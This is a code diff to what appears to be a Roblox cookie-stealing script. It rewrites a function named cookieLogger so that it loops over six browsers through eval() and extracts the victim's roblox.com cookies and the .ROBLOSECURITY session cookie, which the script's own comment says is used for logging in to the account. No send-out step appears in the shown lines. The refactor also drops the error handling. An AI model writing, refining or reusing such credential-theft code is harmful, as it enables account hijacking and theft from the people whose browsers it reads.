@@ -26,56 +26,16 @@ print(dummy_message)
 ################### Gathering INFOMATION #################################
 def cookieLogger():
 
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+    data = [] # data[0] == All Cookies // data[1] == .ROBLOSECURITY Cookie
 
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+    browsers = ['firefox', 'brave', 'chromium', 'edge', 'opera', 'chrome']
+    for browser in browsers:
+        cookies = eval(f"""browser_cookie3.{browser}(domain_name='roblox.com')""")
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
                 data.append(cookies)
-                data.append(cookie.value)
+                data.append(cookie.value);
                 return data
-    except:
-        pass
-    try:
-        cookies = browser_cookie3.chromium(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
 
 
 cookies = cookieLogger()
